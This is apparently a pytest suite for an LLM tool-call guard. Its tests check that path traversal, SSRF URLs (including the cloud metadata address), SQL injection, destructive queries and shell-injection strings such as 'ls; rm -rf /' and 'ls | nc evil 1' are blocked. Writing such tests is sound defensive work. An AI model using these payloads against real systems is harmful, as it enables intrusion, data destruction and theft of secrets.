"""LLM06: tool-call guard."""
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.pipeline.policy import PolicyEngine
from app.pipeline.rules import RuleEngine
from app.pipeline.tool_guard import check_tool_call, validate_tools_section
from sentinel import Guard, ToolBlocked
from pathlib import Path
import app as app_pkg

TOOLS = {
    "allowed": {
        "search": {"args": {
            "query": {"required": True, "max_length": 50},
            "limit": {"type": "integer", "minimum": 1, "maximum": 10},
            "exact": {"type": "boolean"},
            "mode": {"enum": ["fast", "full"]},
        }},
        "read_file": {"args": {"path": {"kind": "path", "roots": ["/srv/docs"]}}},
        "fetch": {"args": {"url": {"kind": "url"}}},
        "fetch_acme": {"args": {"url": {"kind": "url", "allowed_domains": ["acme.com"]}}},
        "db": {"args": {"sql": {"kind": "sql"}}},
        "db_rw": {"args": {"sql": {"kind": "sql", "readonly": False}}},
        "sh": {"args": {"cmd": {"kind": "shell"}}},
        "mail": {"confirm": True, "args": {"to": {"pattern": r"[^@\s]+@acme\.com"}}},
        "ping": None,
    }
}


def run(tool, args, tools=TOOLS):
    return check_tool_call(tool, args, tools)


def violations(tool, args):
    return run(tool, args).violations


class TestGate:
    def test_valid_call_allowed(self):
        r = run("search", {"query": "refund policy", "limit": 5})
        assert r.verdict == "allow" and not r.violations

    def test_no_policy_denies_everything(self):
        r = check_tool_call("search", {"query": "x"}, None)
        assert r.verdict == "block" and r.violations == ["no_tool_policy"]

    def test_unlisted_tool(self):
        assert violations("delete_all", {}) == ["tool_not_allowed"]

    @pytest.mark.parametrize("name", ["", "a b", "a;b", "x\x00", "a" * 129, "../x"])
    def test_bad_names(self, name):
        assert run(name, {}).verdict == "block"

    def test_non_dict_args(self):
        assert violations("search", ["x"]) == ["args_not_object"]

    def test_no_args_tool(self):
        assert run("ping", {}).verdict == "allow"
        assert violations("ping", {"x": 1}) == ["arg_unknown:x"]

    def test_unknown_arg_blocked(self):
        assert "arg_unknown:admin" in violations("search", {"query": "x", "admin": True})

    def test_missing_required(self):
        assert violations("search", {}) == ["arg_missing:query"]

    def test_oversized_args(self):
        assert violations("search", {"query": "x" * 20000}) == ["args_too_large"]


class TestTypes:
    def test_wrong_type(self):
        assert violations("search", {"query": 5}) == ["arg_type:query"]
        assert violations("search", {"query": "x", "limit": "3"}) == ["arg_type:limit"]

    def test_bool_is_not_int(self):
        assert violations("search", {"query": "x", "limit": True}) == ["arg_type:limit"]

    def test_range_and_enum_and_length(self):
        assert violations("search", {"query": "x", "limit": 99}) == ["arg_range:limit"]
        assert violations("search", {"query": "x", "mode": "evil"}) == ["arg_enum:mode"]
        assert violations("search", {"query": "x" * 51}) == ["arg_too_long:query"]

    def test_control_chars(self):
        assert violations("search", {"query": "a\x00b"}) == ["arg_control_chars:query"]

    def test_pattern_is_fullmatch(self):
        assert run("mail", {"to": "a@acme.com"}).verdict == "review"
        assert "arg_pattern:to" in violations("mail", {"to": "a@acme.com.evil.io"})
        assert "arg_pattern:to" in violations("mail", {"to": "x a@acme.com"})


class TestPath:
    @pytest.mark.parametrize("p", [
        "/srv/docs/a.md", "/srv/docs/sub/b.txt", "/srv/docs",
    ])
    def test_ok(self, p):
        assert run("read_file", {"path": p}).verdict == "allow"

    @pytest.mark.parametrize("p", [
        "/etc/passwd", "/srv/docs/../../etc/passwd", "/srv/docs/..%2f..%2fetc/passwd",
        "/srv/docs/%2e%2e/secret", "/srv/docsevil/x", "relative/x", "~/x",
        "/srv/docs\\..\\x", "",
    ])
    def test_blocked(self, p):
        assert "arg_path:path" in violations("read_file", {"path": p})


class TestUrl:
    @pytest.mark.parametrize("u", [
        "https://example.com/a", "http://docs.acme.com/x?y=1",
    ])
    def test_ok(self, u):
        assert run("fetch", {"url": u}).verdict == "allow"

    @pytest.mark.parametrize("u", [
        "http://127.0.0.1/admin", "http://localhost:8080", "http://169.254.169.254/latest/meta-data",
        "http://10.0.0.5/", "http://192.168.1.1/", "http://[::1]/", "http://[::ffff:127.0.0.1]/",
        "http://2130706433/", "http://0x7f.0.0.1/", "http://metadata.google.internal/",
        "http://svc.local/", "file:///etc/passwd", "ftp://example.com/", "gopher://example.com",
        "http://user:pw@example.com/", "javascript:alert(1)", "not a url", "http:///x",
    ])
    def test_ssrf_blocked(self, u):
        assert "arg_url:url" in violations("fetch", {"url": u})

    def test_allowed_domains(self):
        ok = lambda u: run("fetch_acme", {"url": u}).verdict == "allow"
        assert ok("https://acme.com/x") and ok("https://docs.acme.com/x")
        assert not ok("https://evil.com/x") and not ok("https://acme.com.evil.com/x")
        assert not ok("https://notacme.com/")


class TestSql:
    def test_select_ok(self):
        assert run("db", {"sql": "SELECT id FROM orders WHERE id = 5"}).verdict == "allow"

    @pytest.mark.parametrize("q", [
        "SELECT 1; DROP TABLE users", "DROP TABLE users", "DELETE FROM users",
        "UPDATE users SET admin = 1", "SELECT 1 UNION SELECT password FROM users",
        "SELECT * FROM t WHERE a = 1 OR 1=1",
    ])
    def test_readonly_blocks(self, q):
        assert any(v.startswith("arg_sql:sql") for v in violations("db", {"sql": q}))

    def test_readwrite_still_blocks_destructive(self):
        assert any(v.startswith("arg_sql") for v in violations("db_rw", {"sql": "DROP TABLE users"}))
        assert run("db_rw", {"sql": "UPDATE t SET a = 1 WHERE id = 2"}).verdict == "allow"


class TestShell:
    def test_clean(self):
        assert run("sh", {"cmd": "ls -la reports"}).verdict == "allow"

    @pytest.mark.parametrize("c", [
        "ls; rm -rf /", "ls && id", "ls | nc evil 1", "echo `id`", "echo $(id)",
        "cat <(id)", "ls > /etc/x", "ls\nid", "a\\b", "echo ${IFS}",
    ])
    def test_metachar(self, c):
        assert violations("sh", {"cmd": c}) == ["arg_shell:cmd"]


class TestSecrets:
    def test_entropy_secret_in_free_text_arg(self):
        assert "arg_secret:query" in violations("search", {"query": 'api_key="Zk8fQ2xP9mTn4VbL7wRc"'})

    def test_known_key_via_rule_engine(self):
        rules = RuleEngine(rules_path=Path(app_pkg.__file__).parent / "rules" / "output.yaml")
        r = check_tool_call("search", {"query": "AKIA" + "ABCDEFGHIJKLMNOP"}, TOOLS, rule_engine=rules)
        assert "arg_secret:query" in r.violations

    def test_pattern_pinned_arg_skips_entropy_scan(self):
        tools = {"allowed": {"get": {"args": {"id": {"pattern": r"[A-Za-z0-9]{32}"}}}}}
        assert check_tool_call("get", {"id": "8fK2Qx9PmT4vNbL7wRcZ3yH6jD1sAe0U"}, tools).verdict == "allow"


class TestConfirm:
    def test_confirm_returns_review(self):
        r = run("mail", {"to": "bob@acme.com"})
        assert r.verdict == "review" and r.requires_confirmation

    def test_invalid_call_blocks_before_confirm(self):
        r = run("mail", {"to": "bob@evil.com"})
        assert r.verdict == "block" and not r.requires_confirmation


class TestPolicyValidation:
    @pytest.mark.parametrize("section", [
        [], {"x": 1}, {"allowed": []}, {"allowed": {"bad name": {}}},
        {"allowed": {"t": {"nope": 1}}}, {"allowed": {"t": {"confirm": "yes"}}},
        {"allowed": {"t": {"args": {"a": {"kind": "path"}}}}},                    # no roots
        {"allowed": {"t": {"args": {"a": {"kind": "path", "roots": ["rel"]}}}}},
        {"allowed": {"t": {"args": {"a": {"kind": "magic"}}}}},
        {"allowed": {"t": {"args": {"a": {"pattern": "("}}}}},
        {"allowed": {"t": {"args": {"a": {"type": "integer", "kind": "url"}}}}},
        {"allowed": {"t": {"args": {"a": {"enum": []}}}}},
        {"allowed": {"t": {"args": {"a": {"allowed_domains": ["x.com"]}}}}},
        {"allowed": {"t": {"args": {"a": {"max_length": 0}}}}},
    ])
    def test_rejects(self, section):
        with pytest.raises(ValueError):
            validate_tools_section("p", section)

    def test_accepts_example_policy(self):
        eng = PolicyEngine(policies_dir=Path(__file__).resolve().parents[1] / "policies")
        assert "search_kb" in eng.tool_rules("support-bot", ["default"])["allowed"]

    def test_role_tools_replace_default(self, tmp_path):
        (tmp_path / "a.yaml").write_text(
            "id: a\ntools:\n  allowed:\n    t1: {}\n"
            "roles:\n  admin:\n    tools:\n      allowed:\n        t2: {}\n"
        )
        eng = PolicyEngine(policies_dir=tmp_path)
        assert set(eng.tool_rules("a", ["default"])["allowed"]) == {"t1"}
        assert set(eng.tool_rules("a", ["admin"])["allowed"]) == {"t2"}
        assert eng.tool_rules("missing", ["default"]) is None
        assert eng.tool_rules(None, ["default"]) is None


class TestSdkAndRest:
    def test_sdk(self):
        g = Guard.from_policy("policies")
        assert g.check_tool_call("search_kb", {"query": "hi"}, application_id="support-bot").verdict == "allow"
        assert g.check_tool_call("send_email", {"to": "a@acme.com"}, application_id="support-bot").verdict == "review"
        with pytest.raises(ToolBlocked) as e:
            g.check_tool_call("rm", {}, application_id="support-bot", raise_on_block=True)
        assert e.value.violations == ["tool_not_allowed"]

    def test_sdk_no_application_denies(self):
        r = Guard.from_policy("policies").check_tool_call("search_kb", {"query": "hi"})
        assert r.verdict == "block" and r.violations == ["no_tool_policy"]

    def test_rest(self):
        with TestClient(app) as c:
            ok = c.post("/v1/tools/check", json={
                "tool": "read_doc", "arguments": {"path": "/srv/docs/a.md"},
                "context": {"application_id": "support-bot"},
            })
            assert ok.status_code == 200 and ok.json()["verdict"] == "allow"
            bad = c.post("/v1/tools/check", json={
                "tool": "read_doc", "arguments": {"path": "/etc/passwd"},
                "context": {"application_id": "support-bot"},
            }).json()
            assert bad["verdict"] == "block" and "arg_path:path" in bad["violations"]
            assert "/etc/passwd" not in str(bad)
            none = c.post("/v1/tools/check", json={"tool": "read_doc", "arguments": {}}).json()
            assert none["violations"] == ["no_tool_policy"]


def test_empty_non_dict_args_rejected():
    with pytest.raises(ValueError):
        validate_tools_section("p", {"allowed": {"t": {"args": []}}})
